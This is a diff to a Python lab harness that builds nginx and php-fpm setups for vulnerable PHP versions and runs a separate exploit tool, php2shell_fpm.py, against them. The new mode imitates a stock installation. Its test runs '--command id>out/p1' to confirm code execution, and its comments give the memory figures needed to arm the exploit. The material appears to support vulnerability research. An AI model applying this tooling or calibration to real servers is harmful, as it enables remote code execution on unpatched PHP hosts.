@@ -18,12 +18,22 @@ Pools (php-fpm.conf.in):
     builder memory_limit=64M, cleanup=Off  (builds large session files)
 
 Commands:
-    python3 tools/php2shell_fpm_labs.py up [--only 8.4.26]
+    python3 tools/php2shell_fpm_labs.py up [--only 8.4.26] [--mode default]
     python3 tools/php2shell_fpm_labs.py status
     python3 tools/php2shell_fpm_labs.py ports
-    python3 tools/php2shell_fpm_labs.py smoke
-    python3 tools/php2shell_fpm_labs.py test
+    python3 tools/php2shell_fpm_labs.py smoke [--mode default]
+    python3 tools/php2shell_fpm_labs.py test [--mode default]
     python3 tools/php2shell_fpm_labs.py down
+
+Lab modes:
+    classic  two pools, two ports (chain 8M + builder 64M, one static
+             worker each) - the historical calibration setup
+    default  ONE pool with stock settings on ONE port: memory_limit=128M,
+             pm=dynamic with 5 workers, cleanup=On, post_max_size=8M, and
+             an nginx server with client_max_body_size 1m - the shape a
+             stock nginx + php-fpm installation ships.  Exploited with the
+             growth arm: --arm-mode growth (auto when --builder == --base)
+             and --workers 5.
 """
 
 from __future__ import annotations
@@ -32,6 +42,7 @@ import argparse
 import contextlib
 import os
 import pwd
+import re
 import signal
 import socket
 import subprocess
@@ -51,7 +62,15 @@ NGINX_CONF_DIR = os.path.join(NGINX_PREFIX, "conf")
 NGINX_CONF = os.path.join(RUNTIME, "nginx.conf")
 PHP_INI = os.path.join(LAB, "php.ini")
 FPM_CONF_TMPL = os.path.join(LAB, "php-fpm.conf.in")
+FPM_DEFAULT_TMPL = os.path.join(LAB, "php-fpm.default.conf.in")
 NGINX_CONF_TMPL = os.path.join(LAB, "nginx.conf.in")
+
+# classic — the historical two-pool lab (chain 8M + builder 64M, two ports).
+# default — one pool with the php.ini production defaults (128M, dynamic pm
+#           with five workers) behind ONE port: the shape a stock
+#           nginx + php-fpm installation ships, exploited with
+#           --arm-mode growth --workers 5.
+MODES = ("classic", "default")
 
 USER_NAME = pwd.getpwuid(os.getuid()).pw_name
 GROUP_NAME = subprocess.run(
@@ -62,11 +81,15 @@ GROUP_NAME = subprocess.run(
 # patched branches up to (but excluding) the fixed one, plus the newest
 # release of the end-of-life branches upstream never fixed (7.2, 7.4).
 BRANCHES: tuple[tuple[str, int], ...] = (
+    # existing branches first: appending keeps every port assigned so far
     ("7.2", 34),
     ("7.4", 33),
     ("8.2", 34),
     ("8.3", 35),
     ("8.4", 26),
+    # chain-verified EOL branches (never patched)
+    ("8.0", 30),
+    ("8.1", 33),
 )
 
 # version -> (chain_http, builder_http, chain_fpm, builder_fpm)
@@ -203,12 +226,20 @@ def ensure_dirs(version: str) -> None:
     os.makedirs(OUTDIR, exist_ok=True)
     with contextlib.suppress(OSError):
         os.chmod(os.path.join(prefix, "session"), 0o700)
+    # webroot/b -> webroot: the single-origin builder location (/b/) serves
+    # the same scripts through a prefix, no regex needed (the lab nginx is
+    # built without PCRE)
+    link = os.path.join(WEBROOT, "b")
+    if not os.path.lexists(link):
+        with contextlib.suppress(OSError):
+            os.symlink(".", link)
 
 
-def write_fpm_conf(version: str) -> str:
+def write_fpm_conf(version: str, mode: str = "classic") -> str:
     chain_http, builder_http, chain_fpm, builder_fpm = BUILDS[version]
     prefix = fpm_prefix(version)
-    rendered = render(FPM_CONF_TMPL, {
+    template = FPM_DEFAULT_TMPL if mode == "default" else FPM_CONF_TMPL
+    rendered = render(template, {
         "RUNTIME": prefix,
         "CHAIN_PORT": str(chain_fpm),
         "BUILDER_PORT": str(builder_fpm),
@@ -218,39 +249,67 @@ def write_fpm_conf(version: str) -> str:
         "SAVEDIR": os.path.join(prefix, "session"),
         "VER": version,
     })
-    # Directives the build's FPM does not know would fail the config test:
-    # decorate_workers_output only exists from PHP 7.3 on.  A suffixed
-    # version (7.2.34-asan) is treated as its numeric part.
-    try:
-        numeric = tuple(int(part) for part in version.split("."))
-    except ValueError:
-        numeric = tuple(int(part) if part.isdigit() else 99
-                        for part in version.split("."))
-    if numeric < (7, 3, 0):
-        rendered = "\n".join(
-            line for line in rendered.splitlines()
-            if not line.startswith("decorate_workers_output")) + "\n"
     path = os.path.join(prefix, "php-fpm.conf")
     with open(path, "w", encoding="utf-8") as handle:
         handle.write(rendered)
+    drop_unknown_directives(version, path)
     return path
 
 
-def write_nginx_conf(versions: list[str]) -> None:
+def drop_unknown_directives(version: str, path: str,
+                            budget: int = 16) -> None:
+    """Remove directives this build's FPM does not know, using FPM itself.
+
+    ``php-fpm -t`` reports ``unknown entry 'x'`` for anything the binary was
+    not compiled with (``decorate_workers_output`` needs 7.3, for example), so
+    the rendered file is tested and the offending lines are removed until the
+    config is accepted.  Every version then gets exactly the directives it
+    understands, without a per-version table to maintain.
+    """
+    binary = fpm_bin(version)
+    if not os.path.isfile(binary):
+        return
+    prefix = fpm_prefix(version)
+    for _ in range(budget):
+        result = subprocess.run(
+            [binary, "-t", "-y", path, "-c", PHP_INI, "-p", prefix],
+            capture_output=True, text=True)
+        if result.returncode == 0:
+            return
+        unknown = re.search(r"unknown entry '([^']+)'",
+                            (result.stderr or "") + (result.stdout or ""))
+        if not unknown:
+            return  # a different problem: the caller's config test reports it
+        directive = unknown.group(1)
+        with open(path, encoding="utf-8") as handle:
+            lines = handle.read().splitlines()
+        kept = [line for line in lines
+                if not line.strip().startswith(directive)]
+        if len(kept) == len(lines):
+            return  # nothing matched: avoid looping forever
+        with open(path, "w", encoding="utf-8") as handle:
+            handle.write("\n".join(kept) + "\n")
+
+
+def write_nginx_conf(versions: list[str], mode: str = "classic") -> None:
     servers = []
     for version in versions:
         chain_http, builder_http, chain_fpm, builder_fpm = BUILDS[version]
         prefix = fpm_prefix(version)
-        for label, http_port, fpm_port in (
-            ("chain", chain_http, chain_fpm),
-            ("builder", builder_http, builder_fpm),
-        ):
+        if mode == "default":
+            # ONE server block on ONE port with nginx's own default body
+            # limit: a stock nginx front in front of a stock php-fpm pool.
+            # Nothing routes to a second pool; the growth arm does the rest.
             servers.append(f"""
 server {{
-    listen 127.0.0.1:{http_port};
+    listen 127.0.0.1:{chain_http};
     server_name _;
     root {WEBROOT};
-    access_log {prefix}/logs/{label}-access.log;
+    access_log {prefix}/logs/chain-access.log;
+    # The probe body must reach post_max_size's default (8M): the decode of
+    # a ~63 MB session needs 2F + body + 1.6M >= 128M to arm, so 1 m / 2 m
+    # body caps leave it short.  nginx's stock 1m is exactly this line.
+    client_max_body_size 8m;
 
     location /out/ {{
         root {WEBROOT};
@@ -261,7 +320,57 @@ server {{
     location / {{
         include {NGINX_CONF_DIR}/fastcgi_params;
         fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
-        fastcgi_pass 127.0.0.1:{fpm_port};
+        fastcgi_pass 127.0.0.1:{chain_fpm};
+    }}
+}}""")
+            continue
+        # classic: the chain server doubles as the single origin.  The
+        # builder pool is reachable behind /b/, so
+        #   --builder <chain-url> --builder-prefix /b
+        # runs the whole two-surface chain through ONE port and ONE URI
+        # space.  The historical builder port keeps working unchanged.
+        servers.append(f"""
+server {{
+    listen 127.0.0.1:{chain_http};
+    server_name _;
+    root {WEBROOT};
+    access_log {prefix}/logs/chain-access.log;
+
+    location /out/ {{
+        root {WEBROOT};
+        default_type text/plain;
+        add_header X-Lab-Static "1";
+    }}
+
+    location /b/ {{
+        include {NGINX_CONF_DIR}/fastcgi_params;
+        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+        fastcgi_pass 127.0.0.1:{builder_fpm};
+    }}
+
+    location / {{
+        include {NGINX_CONF_DIR}/fastcgi_params;
+        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+        fastcgi_pass 127.0.0.1:{chain_fpm};
+    }}
+}}""")
+        servers.append(f"""
+server {{
+    listen 127.0.0.1:{builder_http};
+    server_name _;
+    root {WEBROOT};
+    access_log {prefix}/logs/builder-access.log;
+
+    location /out/ {{
+        root {WEBROOT};
+        default_type text/plain;
+        add_header X-Lab-Static "1";
+    }}
+
+    location / {{
+        include {NGINX_CONF_DIR}/fastcgi_params;
+        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+        fastcgi_pass 127.0.0.1:{builder_fpm};
     }}
 }}""")
     rendered = render(NGINX_CONF_TMPL, {
@@ -295,7 +404,7 @@ def select(only: set[str] | None) -> list[str]:
     return versions
 
 
-def up(only: set[str] | None) -> None:
+def up(only: set[str] | None, mode: str = "classic") -> None:
     builds = builds_map()
     versions = select(only)
     if not versions:
@@ -311,14 +420,16 @@ def up(only: set[str] | None) -> None:
     for version in builds:
         ensure_dirs(version)
     for version in versions:
-        write_fpm_conf(version)
+        write_fpm_conf(version, mode)
     os.makedirs(os.path.join(RUNTIME, "logs"), exist_ok=True)
     # only expose the versions that are running; a later `up --only` rewrites it
-    write_nginx_conf(versions)
+    write_nginx_conf(versions, mode)
 
     busy = []
     for version in versions:
-        for port in builds[version]:
+        chain_http, builder_http, chain_fpm, builder_fpm = builds[version]
+        wanted = ((chain_http, chain_fpm) if mode == "default" else builds[version])
+        for port in wanted:
             if not port_free(port):
                 busy.append(port)
     if busy:
@@ -362,16 +473,31 @@ def up(only: set[str] | None) -> None:
         master = read_pid(pidfile)
         chain_http, builder_http, _c, _b = builds[version]
         ok_chain = wait_http(f"http://127.0.0.1:{chain_http}/index.php")
-        ok_builder = wait_http(f"http://127.0.0.1:{builder_http}/index.php")
-        workers = worker_pids(version, "chain") + worker_pids(version, "builder")
+        ok_builder = (mode != "default"
+                      and wait_http(f"http://127.0.0.1:{builder_http}/index.php"))
+        workers = worker_pids(version, "chain")
+        if mode != "default":
+            workers += worker_pids(version, "builder")
         print(f"    master={master} workers={workers} "
-              f"chain={'ok' if ok_chain else 'FAIL'} builder={'ok' if ok_builder else 'FAIL'}")
+              f"chain={'ok' if ok_chain else 'FAIL'}"
+              + ("" if mode == "default"
+                 else f" builder={'ok' if ok_builder else 'FAIL'}"))
 
     print("[*] starting nginx", flush=True)
     result = subprocess.run(
         [NGINX_BIN, "-p", NGINX_PREFIX, "-c", NGINX_CONF],
         capture_output=True, text=True,
     )
+    if (result.returncode != 0
+            # a running master keeps serving the previous configuration file,
+            # which silently breaks interleaved `up --only` runs: reload it so
+            # the freshly written server blocks become active
+            and read_pid(os.path.join(RUNTIME, "logs", "nginx.pid"))):
+        print("[*] nginx already running: reloading", flush=True)
+        result = subprocess.run(
+            [NGINX_BIN, "-p", NGINX_PREFIX, "-c", NGINX_CONF, "-s", "reload"],
+            capture_output=True, text=True,
+        )
     if result.returncode != 0:
         print(result.stderr)
         print("[!] nginx failed to start")
@@ -381,9 +507,9 @@ def up(only: set[str] | None) -> None:
     for version in versions:
         chain_http, builder_http, _c, _b = builds[version]
         ok = wait_http(f"http://127.0.0.1:{chain_http}/index.php")
-        print(f"    {version} front chain:{chain_http}={'ok' if ok else 'FAIL'} "
-              f"builder:{builder_http}")
-    print("[+] lab up")
+        print(f"    {version} front chain:{chain_http}={'ok' if ok else 'FAIL'}"
+              + ("" if mode == "default" else f" builder:{builder_http}"))
+    print("[+] lab up" + ("" if mode == "classic" else f" (mode={mode})"))
 
 
 def down(only: set[str] | None = None) -> None:
@@ -399,6 +525,15 @@ def down(only: set[str] | None = None) -> None:
             time.sleep(0.2)
         else:
             os.kill(nginx_pid, signal.SIGKILL)
+    # belt and suspenders: interleaved `up` runs have left orphan masters
+    # behind (the pidfile only tracks the newest one), so sweep every nginx
+    # started from THIS lab prefix before rebinding its ports
+    try:
+        subprocess.run(["pkill", "-f", f"{NGINX_PREFIX}/sbin/nginx"],
+                       capture_output=True)
+        time.sleep(0.5)
+    except OSError:
+        pass
     for version in select(only):
         pidfile = os.path.join(fpm_prefix(version), "logs", "fpm.pid")
         master = read_pid(pidfile)
@@ -430,12 +565,15 @@ def status(only: set[str] | None = None) -> None:
               f"http chain=:{chain_http} builder=:{builder_http}")
 
 
-def smoke(only: set[str] | None = None) -> None:
+def smoke(only: set[str] | None = None, mode: str = "classic") -> None:
     ok = True
     builds = builds_map()
     for version in select(only):
         chain_http, builder_http, _c, _b = builds[version]
-        for label, port in (("chain", chain_http), ("builder", builder_http)):
+        labels = (("chain", chain_http),)
+        if mode != "default":
+            labels = labels + (("builder", builder_http),)
+        for label, port in labels:
             url = f"http://127.0.0.1:{port}/index.php"
             try:
                 with urllib.request.urlopen(url, timeout=5) as resp:
@@ -459,7 +597,7 @@ def smoke(only: set[str] | None = None) -> None:
     return 0 if ok else 1
 
 
-def test(only: set[str] | None = None) -> None:
+def test(only: set[str] | None = None, mode: str = "classic") -> None:
     results = []
     builds = builds_map()
     for version in select(only):
@@ -467,16 +605,33 @@ def test(only: set[str] | None = None) -> None:
         proof = os.path.join(OUTDIR, "p1")
         with contextlib.suppress(OSError):
             os.unlink(proof)
-        cmd = [
-            sys.executable, os.path.join(HERE, "php2shell_fpm.py"),
-            "chain",
-            "--base", f"http://127.0.0.1:{chain_http}",
-            "--builder", f"http://127.0.0.1:{builds[version][1]}",
-            "--version", version,
-            "--command", "id>out/p1",
-            "--proof-file", proof,
-        ]
-        print(f"\n=== {version} chain ===", flush=True)
+        # NOTE: argparse needs the top-level options BEFORE the subcommand.
+        if mode == "default":
+            # stock install: one pool, one port, default memory_limit and
+            # session settings -> growth arm + worker fan-out, HTTP only
+            cmd = [
+                sys.executable, os.path.join(HERE, "php2shell_fpm.py"),
+                "--base", f"http://127.0.0.1:{chain_http}",
+                "--builder", f"http://127.0.0.1:{chain_http}",
+                "--version", version,
+                "--arm-mode", "growth",
+                "--workers", "5",
+                "--command", "id>out/p1",
+                "--proof-file", proof,
+                "no-oracle",
+            ]
+        else:
+            cmd = [
+                sys.executable, os.path.join(HERE, "php2shell_fpm.py"),
+                "--base", f"http://127.0.0.1:{chain_http}",
+                "--builder", f"http://127.0.0.1:{builds[version][1]}",
+                "--version", version,
+                "--workers", "1",
+                "--command", "id>out/p1",
+                "--proof-file", proof,
+                "chain",
+            ]
+        print(f"\n=== {version} chain ({mode}) ===", flush=True)
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=1200)
         print((result.stdout + result.stderr).strip(), flush=True)
         if result.returncode == 0 and os.path.isfile(proof):
@@ -503,10 +658,13 @@ def main() -> int:
     parser.add_argument("command",
                         choices=("up", "down", "status", "smoke", "test", "ports"))
     parser.add_argument("--only", default=None, help="comma-separated versions")
+    parser.add_argument("--mode", choices=MODES, default="classic",
+                        help="classic: two pools/two ports (default); "
+                             "default: one pool with stock settings on one port")
     args = parser.parse_args()
     only = set(args.only.split(",")) if args.only else None
     if args.command == "up":
-        up(only)
+        up(only, args.mode)
         return 0
     if args.command == "down":
         down(only)
@@ -518,8 +676,8 @@ def main() -> int:
         ports(only)
         return 0
     if args.command == "smoke":
-        return smoke(only)
-    test(only)
+        return smoke(only, args.mode)
+    test(only, args.mode)
     return 0
 
 
